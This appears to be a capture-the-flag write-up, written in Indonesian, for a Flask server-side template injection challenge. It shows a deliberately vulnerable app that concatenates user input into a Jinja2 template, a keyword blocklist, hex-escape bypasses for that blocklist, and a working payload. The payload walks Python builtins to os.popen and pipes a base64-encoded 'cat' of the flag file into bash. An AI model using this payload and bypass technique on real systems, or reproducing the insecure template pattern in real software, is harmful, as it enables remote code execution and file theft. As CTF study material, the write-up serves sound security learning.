# SSTI

## Analisa source code

```py
from flask import Flask, render_template_string, request, redirect, url_for, session

app = Flask(__name__)
app.secret_key = 'Devit Ganteng :]'

@app.route('/')
def index():
    tasks = session.get('tasks', 'Hallo sayang absen yuks !! h3h3h3 muachh ')

    # Template HTML
    template_string = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Simple Absen List</title>
    </head>
    <body>
        <h1>Nino Absen List</h1>
        <form action="{{ url_for('add') }}" method="post">
            <label for="task">Absen Kuy:</label>
            <input type="text" id="task" name="task" required>
            <button type="submit">Absen</button>
        </form>
        <ul>
            <li>
                """+tasks+"""
            </li>
        </ul>
    </body>
    </html>
    """

    return render_template_string(template_string, tasks=tasks)

@app.route('/add', methods=['POST'])
def add():
    task = request.form.get('task')
    #filtering
    not_allowed = ["app.py","app","app.","flag.txt","*", ">", "<", ">>", "|", "&", "$", ";","~","[","]","#","!","-"]
    for keyword in not_allowed:
        if keyword in task:
            session['tasks']="Kamu tidak boleh melakukan hal itu !! Sayang"
            return redirect(url_for('index'))
    #end filtering
    session['tasks'] = "Hallo 👋 "+task+" Terimakasih sudah absen"

    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=False)
```

#### Vulnerability

```bash
return render_template_string(template_string, tasks=tasks)
```

penjelasan :</br></br>
Pada baris ini, template string dirender menggunakan fungsi render_template_string. SSTI terjadi karena template_string dapat berisi string yang dieksekusi oleh Jinja2.

#### Not allowed char

```bash
app.py , app, app., flag.txt, *, >, <. >>. |, &, $, ;, ~, [, ], #, !, -
```

#### Basic injection

```bash
{{100/10}}
```

### Bypass

```bash
   . = \x2E
   * = \x2A
   > = \x3E
   < = \x3C
   >> = \x3E\x3E
   | = \x7C
   & = \x26
   $ = \x24
   ; = \x3B
   ~ = \x7E
   [ = \x5B
   ] = \x5D
   # = \x23
   ! = \x21
   - = \x2D
```

### Flag location

```bash
├── api
│   ├── app.py
│   ├── nino
│   │   ├── flag
│   │   │   └── flag.txt
│   │   └── flag.txt
│   └── __pycache__
│       └── app.cpython-310.pyc
├── flag.txt
├── requirements.txt
└── vercel.json
```

### Payload

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "Y2F0IGFwaS9uaW5vL2ZsYWcvZmxhZy50eHQ=" \x7C base64 \x2Dd \x7C bash').read() }}
```

### Automation

```bash
python3 main.py
```
